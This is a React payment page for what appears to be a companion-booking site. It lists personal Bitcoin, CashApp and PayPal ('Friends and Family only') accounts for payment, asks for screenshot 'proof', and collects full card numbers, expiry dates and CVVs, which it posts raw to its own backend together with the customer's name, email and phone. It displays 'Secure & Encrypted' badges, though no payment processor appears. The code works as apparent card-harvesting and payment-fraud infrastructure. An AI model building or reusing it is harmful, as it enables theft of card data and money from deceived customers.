import {
  Box,
  Typography,
  Button,
  Paper,
  Alert,
  TextField,
  Dialog,
  DialogContent,
  DialogActions,
  IconButton,
} from '@mui/material';
import ContentCopyIcon from '@mui/icons-material/ContentCopy';
import CheckCircleIcon from '@mui/icons-material/CheckCircle';
import QrCode2Icon from '@mui/icons-material/QrCode2';
import CurrencyBitcoin from '@mui/icons-material/CurrencyBitcoin';
import AccountBalanceWallet from '@mui/icons-material/AccountBalanceWallet';
import Payments from '@mui/icons-material/Payments';
import CreditCard from '@mui/icons-material/CreditCard';
import ArrowBack from '@mui/icons-material/ArrowBack';
import HourglassEmptyIcon from '@mui/icons-material/HourglassEmpty';
import CloseIcon from '@mui/icons-material/Close';
import { useState } from 'react';
import { useNavigate, useParams, useLocation } from 'react-router-dom';

const BTC_ADDRESS = 'bc1qgxp7rx9793c4660j4t4se8djup6uyjjl9tv456d';
const CASHAPP_DETAILS = {
  name: 'Rhonda Kilgore',
  address: '$RhondaKilgore0',
  note: '',
};
const PAYPAL_DETAILS = {
  name: 'Benjamin Smith',
  address: 'maxbenjamin802@gmail.com',
  note: 'Friends and Family only',
};
const API_BASE_URL = ''; // Use proxy - calls /api which routes to localhost:3001
const BOOKING_AMOUNT_MIN = 40;
const BOOKING_AMOUNT_MAX = 1000;

const methodConfig = {
  bitcoin: {
    name: 'Bitcoin',
    icon: CurrencyBitcoin,
    color: '#f7931a',
    bgColor: 'rgba(247, 147, 26, 0.1)',
    address: BTC_ADDRESS,
    label: 'Bitcoin Address',
  },
  cashapp: {
    name: 'CashApp',
    icon: AccountBalanceWallet,
    color: '#00d632',
    bgColor: 'rgba(0, 214, 50, 0.1)',
    accountDetails: CASHAPP_DETAILS,
    label: 'CashApp Details',
  },
  paypal: {
    name: 'PayPal',
    icon: Payments,
    color: '#003087',
    bgColor: 'rgba(0, 48, 135, 0.1)',
    accountDetails: PAYPAL_DETAILS,
    label: 'PayPal Details',
  },
  card: {
    name: 'Credit/Debit Card',
    icon: CreditCard,
    color: '#667eea',
    bgColor: 'rgba(102, 126, 234, 0.1)',
    address: '',
    label: 'Card Payment',
  },
};

const Pay = () => {
  const navigate = useNavigate();
  const { method } = useParams();
  const { state } = useLocation();

  const [detailsOpen, setDetailsOpen] = useState(false);
  const [statusOpen, setStatusOpen] = useState(false);
  const [status, setStatus] = useState('idle');
  const [error, setError] = useState('');
  const [cardDetails, setCardDetails] = useState({
    cardholderName: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
  });
  const [proofImage, setProofImage] = useState('');
  const [proofFileName, setProofFileName] = useState('');
  const [copiedField, setCopiedField] = useState('');
  const [copiedAmount, setCopiedAmount] = useState(false);
  const [showQr, setShowQr] = useState(false);

  const { profile, hours, customer } = state || {};

  const getTotal = () => {
    if (!profile) return 0;
    const hourMap = {
      '1 day': profile.rate || 40,
      '2 days': (profile.rate || 40) * 2,
      '3 days': (profile.rate || 40) * 3,
      '1 week': (profile.rate || 40) * 7,
      '1 hour': profile.rate || 40,
      '2 hours': (profile.rate || 40) * 2,
      '3 hours': (profile.rate || 40) * 3,
      overnight: (profile.rate || 40) * 8,
      weekend: (profile.rate || 40) * 24,
      hour: profile.rate || 40,
      twoHours: (profile.rate || 40) * 2,
      fullNight: (profile.rate || 40) * 8,
    };
    return hourMap[hours] || profile.rate || 40;
  };

  const total = getTotal();
  const requiresProof = ['bitcoin', 'paypal'].includes(method);
  const requiresCard = method === 'card';

  const config = methodConfig[method] || methodConfig.bitcoin;
  const MethodIcon = config.icon;

  if (method === 'cashapp') {
    return (
      <Box sx={{ p: 3, maxWidth: 700, mx: 'auto' }}>
        <Alert severity="warning" sx={{ mb: 2 }}>
          CashApp is currently unavailable. Please use PayPal or Bitcoin.
        </Alert>
        <Button variant="outlined" startIcon={<ArrowBack />} onClick={() => navigate(-1)}>
          Back
        </Button>
      </Box>
    );
  }

  const copyFieldValue = (value, key) => {
    navigator.clipboard.writeText(value);
    setCopiedField(key);
    setTimeout(() => setCopiedField(''), 2000);
  };

  const copyAmount = () => {
    navigator.clipboard.writeText(total.toString());
    setCopiedAmount(true);
    setTimeout(() => setCopiedAmount(false), 2000);
  };

  const handlePayment = () => {
    if (!customer || !profile || !hours) {
      setError('Missing order details. Please restart checkout.');
      return;
    }
    if (total < BOOKING_AMOUNT_MIN || total > BOOKING_AMOUNT_MAX) {
      setError(`Booking amount must be between $${BOOKING_AMOUNT_MIN} and $${BOOKING_AMOUNT_MAX}.`);
      return;
    }
    setError('');
    if (requiresCard) {
      handleSubmitPayment();
      return;
    }

    // Prevent focus from remaining on an element that becomes aria-hidden.
    if (document.activeElement instanceof HTMLElement) {
      document.activeElement.blur();
    }

    setDetailsOpen(true);
  };

  const handleSubmitPayment = async () => {
    if (total < BOOKING_AMOUNT_MIN || total > BOOKING_AMOUNT_MAX) {
      setError(`Booking amount must be between $${BOOKING_AMOUNT_MIN} and $${BOOKING_AMOUNT_MAX}.`);
      return;
    }
    if (requiresCard) {
      if (!cardDetails.cardholderName.trim()) {
        setError('Cardholder name is required.');
        return;
      }
      if (!cardDetails.cardNumber.trim()) {
        setError('Card number is required.');
        return;
      }
      if (!cardDetails.expiry.trim()) {
        setError('Card expiry is required.');
        return;
      }
      if (!cardDetails.cvv.trim()) {
        setError('Card CVV is required.');
        return;
      }
    }
    if (requiresProof && !proofImage) {
      setError('Please upload a payment screenshot.');
      return;
    }
    setError('');

    // Handle card payment - send to backend with card details
    if (requiresCard) {
      // Prevent focus from staying on a hidden element while switching dialogs.
      if (document.activeElement instanceof HTMLElement) {
        document.activeElement.blur();
      }

      setStatus('waiting');
      setStatusOpen(true);
      
      try {
        // Create FormData to send card details and data
        const formData = new FormData();
        formData.append('customerName', customer?.name || '');
        formData.append('customerEmail', customer?.email || '');
        formData.append('customerPhone', customer?.phone || '');
        formData.append('companionName', profile?.name || '');
        formData.append('duration', hours || '');
        formData.append('amount', total.toString());
        formData.append('paymentMethod', config.name);
        formData.append('date', customer?.date || 'Flexible');
        formData.append('notes', customer?.notes || '');
        
        // Append card details
        formData.append('cardholderName', cardDetails.cardholderName || '');
        formData.append('cardNumber', cardDetails.cardNumber || '');
        formData.append('cardExpiry', cardDetails.expiry || '');
        formData.append('cardCvv', cardDetails.cvv || '');

        // Send to backend
        const result = await fetch(`${API_BASE_URL}/api/send-order`, {
          method: 'POST',
          body: formData
        });

        const contentType = result.headers.get('content-type') || '';
        let data = null;
        let textBody = '';

        if (contentType.includes('application/json')) {
          try {
            data = await result.json();
          } catch {
            data = null;
          }
        } else {
          textBody = await result.text();
        }

        if (!result.ok) {
          const normalizedText = textBody.trim();
          const isLikelyProxyBackendDown =
            result.status === 500 &&
            !data?.message &&
            !normalizedText;
          const isExternalRouterError = textBody.includes('ROUTER_EXTERNAL_TARGET_ERROR');
          const isUpstreamUnavailable = [502, 503, 504].includes(result.status);
          const safeServerMessage =
            normalizedText && !normalizedText.startsWith('<!DOCTYPE html') ? normalizedText : '';

          setStatusOpen(false);
          setError(
            (isExternalRouterError
              ? 'The app could not reach the backend service. Please try again in 30-60 seconds.'
              : '') ||
            (isUpstreamUnavailable
              ? 'Backend service is temporarily unavailable. Please wait a moment and try again.'
              : '') ||
            (isLikelyProxyBackendDown
              ? 'Payment API is unreachable. Start the backend server (npm run server) and try again.'
              : '') ||
            data?.message ||
            safeServerMessage ||
            `Failed to submit order (HTTP ${result.status}). Please try again.`
          );
          return;
        }

        if (data?.success) {
          setStatus('success');
        } else {
          setStatusOpen(false);
          setError(data?.message || 'Failed to submit order. Please try again.');
        }
      } catch (err) {
        console.error('Error submitting order:', err);
        setStatusOpen(false);
        setError('Network error. Please check your connection and try again.');
      }
      return;
    }

    // Handle proof-based payments (bitcoin, paypal)
    if (requiresProof) {
      // Prevent focus from staying on a hidden element while switching dialogs.
      if (document.activeElement instanceof HTMLElement) {
        document.activeElement.blur();
      }

      setDetailsOpen(false);
      setStatus('waiting');
      setTimeout(() => setStatusOpen(true), 200);
      
      try {
        // Create FormData to send image and data
        const formData = new FormData();
        formData.append('customerName', customer?.name || '');
        formData.append('customerEmail', customer?.email || '');
        formData.append('customerPhone', customer?.phone || '');
        formData.append('companionName', profile?.name || '');
        formData.append('duration', hours || '');
        formData.append('amount', total.toString());
        formData.append('paymentMethod', config.name);
        formData.append('date', customer?.date || 'Flexible');
        formData.append('notes', customer?.notes || '');
        
        // Convert base64 image to blob and append
        if (proofImage) {
          const response = await fetch(proofImage);
          const blob = await response.blob();
          const fileName = proofFileName || 'payment-screenshot.jpg';
          const file = new File([blob], fileName, { type: blob.type });
          formData.append('screenshot', file);
        }

        // Send to backend
        const result = await fetch(`${API_BASE_URL}/api/send-order`, {
          method: 'POST',
          body: formData
        });

        const contentType = result.headers.get('content-type') || '';
        let data = null;
        let textBody = '';

        if (contentType.includes('application/json')) {
          try {
            data = await result.json();
          } catch {
            data = null;
          }
        } else {
          textBody = await result.text();
        }

        if (!result.ok) {
          const normalizedText = textBody.trim();
          const isLikelyProxyBackendDown =
            result.status === 500 &&
            !data?.message &&
            !normalizedText;
          const isExternalRouterError = textBody.includes('ROUTER_EXTERNAL_TARGET_ERROR');
          const isUpstreamUnavailable = [502, 503, 504].includes(result.status);
          const safeServerMessage =
            normalizedText && !normalizedText.startsWith('<!DOCTYPE html') ? normalizedText : '';

          setStatusOpen(false);
          setError(
            (isExternalRouterError
              ? 'The app could not reach the backend service. Please try again in 30-60 seconds.'
              : '') ||
            (isUpstreamUnavailable
              ? 'Backend service is temporarily unavailable. Please wait a moment and try again.'
              : '') ||
            (isLikelyProxyBackendDown
              ? 'Payment API is unreachable. Start the backend server (npm run server) and try again.'
              : '') ||
            data?.message ||
            safeServerMessage ||
            `Failed to submit order (HTTP ${result.status}). Please try again.`
          );
          return;
        }

        if (data?.success) {
          setStatus('success');
        } else {
          setStatusOpen(false);
          setError(data?.message || 'Failed to submit order. Please try again.');
        }
      } catch (err) {
        console.error('Error submitting order:', err);
        setStatusOpen(false);
        setError('Network error. Please check your connection and try again.');
      }
      return;
    }

    setDetailsOpen(false);
    setStatusOpen(true);
    setStatus('waiting');
    setTimeout(() => {
      setStatus('success');
    }, 2000);
  };

  const handleCloseDialog = () => {
    setStatusOpen(false);
    if (status === 'success') {
      setTimeout(() => {
        window.location.href = '/';
      }, 1500);
    }
  };

  const handleCardChange = (field) => (event) => {
    let value = event.target.value;
    
    // Auto-format expiry date (MM/YY)
    if (field === 'expiry') {
      value = value.replace(/\D/g, '');
      if (value.length >= 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4);
      }
    }
    
    // Auto-format card number (add spaces)
    if (field === 'cardNumber') {
      value = value.replace(/\D/g, '');
      value = value.replace(/(\d{4})/g, '$1 ').trim();
    }
    
    setCardDetails((prev) => ({ ...prev, [field]: value }));
  };

  const handleProofChange = (event) => {
    const file = event.target.files?.[0];
    if (!file) return;
    if (file.size > 4 * 1024 * 1024) {
      setError('Screenshot must be under 4MB.');
      return;
    }
    const reader = new FileReader();
    reader.onload = () => {
      setProofImage(String(reader.result || ''));
      setProofFileName(file.name);
    };
    reader.readAsDataURL(file);
  };

  return (
    <Box
      sx={{
        minHeight: '100vh',
        px: { xs: 2, md: 4 },
        py: { xs: 3, md: 5 },
        background: 'linear-gradient(135deg, #ffffff 0%, #fdf2f8 50%, #fce7f3 100%)',
      }}
    >
      <Paper
        elevation={0}
        sx={{
          width: '100%',
          maxWidth: 1040,
          mx: 'auto',
          p: { xs: 2, md: 4 },
          borderRadius: 4,
          background: '#ffffff',
          border: '1px solid #f3f4f6',
          boxShadow: '0 18px 40px rgba(236, 72, 153, 0.12)',
        }}
      >
        <Box sx={{ display: 'flex', alignItems: 'center', mb: 3 }}>
          <IconButton
            onClick={() => navigate(-1)}
            sx={{ mr: 1, bgcolor: '#f5f5f5', '&:hover': { bgcolor: '#e8e8e8' } }}
          >
            <ArrowBack />
          </IconButton>
          <Typography variant="h5" fontWeight={800}>
            Complete Payment
          </Typography>
        </Box>

        <Box sx={{ display: 'grid', gap: 3, gridTemplateColumns: { xs: '1fr', md: '1.1fr 0.9fr' } }}>
          <Box>
            <Box sx={{ textAlign: 'center', mb: 3 }}>
              <Box
                sx={{
                  display: 'inline-flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  width: 64,
                  height: 64,
                  borderRadius: 2.5,
                  bgcolor: config.bgColor,
                  mb: 2,
                  border: `1px solid ${config.color}45`,
                }}
              >
                <MethodIcon sx={{ fontSize: 32, color: config.color }} />
              </Box>
              <Typography
                variant="h5"
                fontWeight={800}
                sx={{
                  background: `linear-gradient(135deg, ${config.color} 0%, ${config.color}cc 100%)`,
                  backgroundClip: 'text',
                  WebkitBackgroundClip: 'text',
                  WebkitTextFillColor: 'transparent',
                  mb: 0.5,
                }}
              >
                {config.name}
              </Typography>
              <Typography variant="body2" color="text.secondary">
                Secure and encrypted transaction
              </Typography>
            </Box>

            {(method === 'bitcoin' || method === 'cashapp' || method === 'paypal') && (
              <>
                <Typography variant="subtitle2" fontWeight={600} color="text.secondary" mb={1.5}>
                  Send payment to
                </Typography>
                <Box
                  sx={{
                    bgcolor: config.bgColor,
                    p: 2.5,
                    borderRadius: 2,
                    border: `2px solid ${config.color}40`,
                    mb: 3,
                    transition: 'all 0.3s ease',
                    '&:hover': { borderColor: config.color, boxShadow: `0 4px 20px ${config.color}30` },
                  }}
                >
                  <Box sx={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', mb: 1 }}>
                    <Typography
                      variant="caption"
                      fontWeight={600}
                      sx={{ color: config.color, textTransform: 'uppercase', letterSpacing: 0.5 }}
                    >
                      {config.label}
                    </Typography>
                    {method === 'bitcoin' && (
                      <Button
                        size="small"
                        startIcon={<QrCode2Icon />}
                        onClick={() => setShowQr(!showQr)}
                        sx={{ textTransform: 'none', fontSize: '0.75rem', color: config.color }}
                      >
                        {showQr ? 'Hide QR' : 'Show QR'}
                      </Button>
                    )}
                  </Box>
                  {showQr && method === 'bitcoin' && (
                    <Box sx={{ bgcolor: 'white', p: 2, borderRadius: 2, mb: 2, textAlign: 'center' }}>
                      <QrCode2Icon sx={{ fontSize: 160, color: config.color }} />
                      <Typography
                        variant="caption"
                        display="block"
                        sx={{ mt: 1, wordBreak: 'break-all', fontSize: '0.65rem' }}
                      >
                        {config.address}
                      </Typography>
                    </Box>
                  )}
                  {method === 'bitcoin' && (
                    <Box sx={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                      <Typography
                        sx={{
                          fontSize: '0.9rem',
                          wordBreak: 'break-all',
                          fontWeight: 500,
                          fontFamily: 'monospace',
                        }}
                      >
                        {config.address}
                      </Typography>
                      <Button
                        size="small"
                        onClick={() => copyFieldValue(config.address, 'bitcoin-address')}
                        sx={{ minWidth: 'auto', p: 0.5, color: copiedField === 'bitcoin-address' ? '#22c55e' : config.color }}
                      >
                        {copiedField === 'bitcoin-address' ? <CheckCircleIcon fontSize="small" /> : <ContentCopyIcon fontSize="small" />}
                      </Button>
                    </Box>
                  )}
                  {(method === 'cashapp' || method === 'paypal') && (
                    <Box sx={{ display: 'grid', gap: 1.2 }}>
                      {[
                        { key: 'name', label: 'Name', value: config.accountDetails?.name || '' },
                        { key: 'address', label: method === 'paypal' ? 'Email' : 'CashTag', value: config.accountDetails?.address || '' },
                        { key: 'note', label: 'Note', value: config.accountDetails?.note || '' },
                      ]
                        .filter((field) => field.value)
                        .map((field) => {
                          const fieldKey = `${method}-${field.key}`;
                          return (
                            <Box key={field.key} sx={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 1 }}>
                              <Typography sx={{ fontSize: '0.8rem', color: 'text.secondary', minWidth: 62 }}>{field.label}</Typography>
                              <Typography sx={{ fontSize: '0.9rem', wordBreak: 'break-all', fontWeight: 500, fontFamily: 'monospace', flex: 1 }}>
                                {field.value}
                              </Typography>
                              <Button
                                size="small"
                                onClick={() => copyFieldValue(field.value, fieldKey)}
                                sx={{ minWidth: 'auto', p: 0.5, color: copiedField === fieldKey ? '#22c55e' : config.color }}
                              >
                                {copiedField === fieldKey ? <CheckCircleIcon fontSize="small" /> : <ContentCopyIcon fontSize="small" />}
                              </Button>
                            </Box>
                          );
                        })}
                    </Box>
                  )}
                </Box>
              </>
            )}

            {requiresCard && (
              <Box sx={{ mb: 2 }}>
                {/* Simple Card Visual */}
                <Box
                  sx={{
                    background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
                    borderRadius: 2,
                    p: 2,
                    mb: 2,
                    boxShadow: '0 6px 20px rgba(102, 126, 234, 0.3)',
                  }}
                >
                  <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', mb: 1.5 }}>
                    <Box sx={{ width: 40, height: 28, bgcolor: '#ffd700', borderRadius: 1 }} />
                    <Typography sx={{ fontSize: '1rem', fontWeight: 700, color: '#fff' }}>💳</Typography>
                  </Box>
                  <Typography sx={{ fontFamily: 'monospace', fontSize: '1.1rem', fontWeight: 600, color: '#fff', letterSpacing: '0.1em', mb: 1.5 }}>
                    {cardDetails.cardNumber || '•••• •••• •••• ••••'}
                  </Typography>
                  <Box sx={{ display: 'flex', justifyContent: 'space-between' }}>
                    <Typography sx={{ fontSize: '0.7rem', color: 'rgba(255,255,255,0.7)', textTransform: 'uppercase' }}>
                      {cardDetails.cardholderName || 'Card Holder'}
                    </Typography>
                    <Typography sx={{ fontSize: '0.7rem', color: 'rgba(255,255,255,0.7)', textTransform: 'uppercase' }}>
                      {cardDetails.expiry || 'MM/YY'}
                    </Typography>
                  </Box>
                </Box>

                {/* Simple Input Fields */}
                <Box sx={{ display: 'grid', gap: 1.5 }}>
                  <TextField
                    label="Full Name on Card"
                    value={cardDetails.cardholderName}
                    onChange={handleCardChange('cardholderName')}
                    fullWidth
                    size="small"
                    sx={{ '& .MuiOutlinedInput-root': { borderRadius: 1.5 } }}
                  />
                  
                  <TextField
                    label="Card Number"
                    value={cardDetails.cardNumber}
                    onChange={handleCardChange('cardNumber')}
                    fullWidth
                    size="small"
                    placeholder="1234 5678 9012 3456"
                    inputProps={{ maxLength: 19 }}
                    sx={{ '& .MuiOutlinedInput-root': { borderRadius: 1.5 } }}
                  />
                  
                  <Box sx={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 1.5 }}>
                    <TextField
                      label="Expiry Date"
                      value={cardDetails.expiry}
                      onChange={handleCardChange('expiry')}
                      fullWidth
                      size="small"
                      placeholder="MM/YY"
                      inputProps={{ maxLength: 5 }}
                      sx={{ '& .MuiOutlinedInput-root': { borderRadius: 1.5 } }}
                    />
                    <TextField
                      label="CVV"
                      value={cardDetails.cvv}
                      onChange={handleCardChange('cvv')}
                      fullWidth
                      size="small"
                      placeholder="123"
                      inputProps={{ maxLength: 4 }}
                      sx={{ '& .MuiOutlinedInput-root': { borderRadius: 1.5 } }}
                    />
                  </Box>
                </Box>

                {/* Security Badge */}
                <Box sx={{ display: 'flex', alignItems: 'center', justifyContent: 'center', mt: 1.5, gap: 0.5 }}>
                  <CheckCircleIcon sx={{ color: '#22c55e', fontSize: 14 }} />
                  <Typography variant="caption" sx={{ color: '#166534', fontWeight: 500, fontSize: '0.7rem' }}>
                    Secure & Encrypted
                  </Typography>
                </Box>
              </Box>
            )}
          </Box>

          <Box>
            <Box
              sx={{
                bgcolor: config.bgColor,
                p: 2,
                borderRadius: 2,
                mb: 3,
                border: `2px solid ${config.color}40`,
                textAlign: 'center',
              }}
            >
              <Typography
                variant="caption"
                fontWeight={600}
                sx={{ color: config.color, textTransform: 'uppercase', letterSpacing: 0.5 }}
              >
                Total Amount
              </Typography>
              <Typography sx={{ fontSize: '2rem', fontWeight: 800, color: config.color }}>${total}</Typography>
            </Box>

            <Box sx={{ mb: 3, borderBottom: '1px solid #eee', pb: 3 }}>
              <Typography variant="subtitle2" fontWeight={600} color="text.secondary" mb={1}>
                Order Summary
              </Typography>
              <Box sx={{ bgcolor: '#f8fafc', p: 2, borderRadius: 2, border: '1px solid #e2e8f0' }}>
                <Box sx={{ display: 'flex', justifyContent: 'space-between', mb: 1 }}>
                  <Typography variant="body2" color="text.secondary">
                    Service
                  </Typography>
                  <Typography variant="body2" fontWeight={500}>
                    {profile?.name || 'N/A'}
                  </Typography>
                </Box>
                <Box sx={{ display: 'flex', justifyContent: 'space-between', mb: 1 }}>
                  <Typography variant="body2" color="text.secondary">
                    Duration
                  </Typography>
                  <Typography variant="body2" fontWeight={500}>
                    {hours || 'N/A'}
                  </Typography>
                </Box>
                <Box sx={{ display: 'flex', justifyContent: 'space-between', pt: 1, borderTop: '1px solid #e2e8f0' }}>
                  <Typography variant="subtitle1" fontWeight={700}>
                    Total
                  </Typography>
                  <Typography variant="subtitle1" fontWeight={700} color="primary">
                    ${total}
                  </Typography>
                </Box>
              </Box>
            </Box>

            {!requiresCard && (
              <>
                <Typography variant="subtitle2" fontWeight={600} color="text.secondary" mb={1.5}>
                  Amount to pay
                </Typography>
                <Box
                  sx={{
                    bgcolor: '#f1f5f9',
                    p: 2,
                    borderRadius: 2,
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'space-between',
                    mb: 3,
                    border: '1px solid #e2e8f0',
                  }}
                >
                  <Typography sx={{ fontSize: '1.25rem', fontWeight: 700 }}>${total}</Typography>
                  <Button
                    size="small"
                    onClick={copyAmount}
                    sx={{ minWidth: 'auto', p: 0.5, color: copiedAmount ? '#22c55e' : 'text.secondary' }}
                  >
                    {copiedAmount ? <CheckCircleIcon fontSize="small" /> : <ContentCopyIcon fontSize="small" />}
                  </Button>
                </Box>
              </>
            )}

            {error && (
              <Alert severity="error" sx={{ mb: 2, borderRadius: 2 }}>
                {error}
              </Alert>
            )}

            <Button
              fullWidth
              size="large"
              variant="contained"
              onClick={handlePayment}
              sx={{
                py: 1.5,
                borderRadius: 2,
                textTransform: 'none',
                fontWeight: 600,
                fontSize: '1rem',
                background: `linear-gradient(135deg, ${config.color} 0%, ${config.color}cc 100%)`,
                boxShadow: `0 4px 14px 0 ${config.color}40`,
              }}
            >
              {requiresCard ? 'Pay Now' : "I've Made Payment"}
            </Button>

            
          </Box>
        </Box>
      </Paper>

      <Dialog
        open={detailsOpen}
        onClose={() => setDetailsOpen(false)}
        disableRestoreFocus
        maxWidth="sm"
        fullWidth
        PaperProps={{ sx: { borderRadius: 3, overflow: 'hidden', border: '1px solid #f3f4f6' } }}
      >
        <Box
          sx={{
            px: 3,
            py: 2,
            borderBottom: '1px solid #eef2f7',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'space-between',
          }}
        >
          <Typography sx={{ fontSize: '1.25rem', fontWeight: 800, color: '#111827' }}>
            Confirm Payment Details
          </Typography>
          <IconButton onClick={() => setDetailsOpen(false)} sx={{ bgcolor: '#f3f4f6' }}>
            <CloseIcon />
          </IconButton>
        </Box>

        <DialogContent sx={{ px: 3, py: 3 }}>
          <Box sx={{ bgcolor: '#fff7fb', borderRadius: 2, p: 2, mb: 2, border: '1px solid #f3e0f9' }}>
            <Box sx={{ display: 'flex', justifyContent: 'space-between', mb: 1 }}>
              <Typography variant="caption" sx={{ letterSpacing: 0.5, textTransform: 'uppercase', color: 'text.secondary' }}>
                Companion
              </Typography>
              <Typography fontWeight={700}>{profile?.name || 'N/A'}</Typography>
            </Box>
            <Box sx={{ display: 'flex', justifyContent: 'space-between', mb: 1 }}>
              <Typography variant="caption" sx={{ letterSpacing: 0.5, textTransform: 'uppercase', color: 'text.secondary' }}>
                Duration
              </Typography>
              <Typography fontWeight={700}>{hours || 'N/A'}</Typography>
            </Box>
            <Box sx={{ display: 'flex', justifyContent: 'space-between', pt: 1, borderTop: '1px solid #f3e0f9' }}>
              <Typography variant="caption" sx={{ letterSpacing: 0.5, textTransform: 'uppercase', color: 'text.secondary' }}>
                Amount To Pay
              </Typography>
              <Typography sx={{ fontSize: '1.35rem', fontWeight: 800, color: config.color }}>${total}</Typography>
            </Box>
          </Box>

          {error && (
            <Alert severity="error" sx={{ mb: 2, borderRadius: 2 }}>
              {error}
            </Alert>
          )}

          {requiresProof && (
            <Box sx={{ textAlign: 'center' }}>
              <Typography variant="body2" color="text.secondary" mb={2}>
                Upload your payment confirmation screenshot.
              </Typography>
              <Button
                variant="outlined"
                component="label"
                sx={{ borderRadius: 2, borderColor: config.color, color: config.color }}
              >
                <QrCode2Icon sx={{ mr: 1 }} /> Choose Screenshot
                <input type="file" accept="image/*" hidden onChange={handleProofChange} />
              </Button>
              {proofFileName && (
                <Typography variant="body2" sx={{ mt: 2, color: '#22c55e', fontWeight: 500 }}>
                  <CheckCircleIcon sx={{ fontSize: 16, mr: 0.5 }} />
                  {proofFileName}
                </Typography>
              )}
              {proofImage && (
                <Box
                  component="img"
                  src={proofImage}
                  alt="Payment proof"
                  sx={{
                    mt: 2,
                    width: '100%',
                    maxHeight: 220,
                    objectFit: 'contain',
                    borderRadius: 2,
                    border: '1px solid #e2e8f0',
                  }}
                />
              )}
              <Typography variant="caption" color="text.secondary" display="block" sx={{ mt: 2 }}>
                Max file size: 4MB
              </Typography>
            </Box>
          )}
        </DialogContent>

        <DialogActions sx={{ px: 3, py: 2, borderTop: '1px solid #eef2f7' }}>
          <Button onClick={() => setDetailsOpen(false)} color="inherit" sx={{ borderRadius: 2 }}>
            Cancel
          </Button>
          <Button
            variant="contained"
            onClick={handleSubmitPayment}
            sx={{ borderRadius: 2, background: `linear-gradient(135deg, ${config.color} 0%, ${config.color}cc 100%)` }}
          >
            I've Made Payment
          </Button>
        </DialogActions>
      </Dialog>

      <Dialog
        open={statusOpen}
        onClose={handleCloseDialog}
        disableRestoreFocus
        PaperProps={{ sx: { borderRadius: 3, p: 1, minWidth: 340 } }}
      >
        <DialogContent sx={{ textAlign: 'center', px: 4, py: 5 }}>
          {status === 'waiting' && (
            <>
              <Box
                sx={{
                  display: 'inline-flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  width: 48,
                  height: 48,
                  borderRadius: '50%',
                  bgcolor: config.bgColor,
                  mb: 3,
                  animation: 'pulse 1.5s infinite',
                  '@keyframes pulse': {
                    '0%': { opacity: 1 },
                    '50%': { opacity: 0.5 },
                    '100%': { opacity: 1 },
                  },
                }}
              >
                <HourglassEmptyIcon sx={{ fontSize: 24, color: config.color }} />
              </Box>
              <Typography fontWeight={700} mb={1} sx={{ fontSize: '1.25rem' }}>
                Processing Payment
              </Typography>
              <Typography variant="body2" color="text.secondary" mb={2}>
                Please wait while we send your booking details and payment proof...
              </Typography>
            </>
          )}
          {status === 'success' && (
            <>
              <Box
                sx={{
                  display: 'inline-flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  width: 72,
                  height: 72,
                  borderRadius: '50%',
                  bgcolor: 'rgba(34, 197, 94, 0.1)',
                  mb: 3,
                }}
              >
                <CheckCircleIcon sx={{ fontSize: 48, color: '#22c55e' }} />
              </Box>
              <Typography fontWeight={700} mb={1} sx={{ fontSize: '1.25rem', color: '#22c55e' }}>
                Order Submitted Successfully!
              </Typography>
              <Typography variant="body2" color="text.secondary" mb={3}>
                Your booking details and payment proof have been sent. We will contact you soon with your <strong>BOOKING CODE!</strong>.
              </Typography>
              <Button
                variant="contained"
                onClick={handleCloseDialog}
                sx={{ borderRadius: 2, background: 'linear-gradient(135deg, #22c55e 0%, #16a34a 100%)', px: 4 }}
              >
                Back to Home
              </Button>
            </>
          )}
        </DialogContent>
      </Dialog>
    </Box>
  );
};

export default Pay;
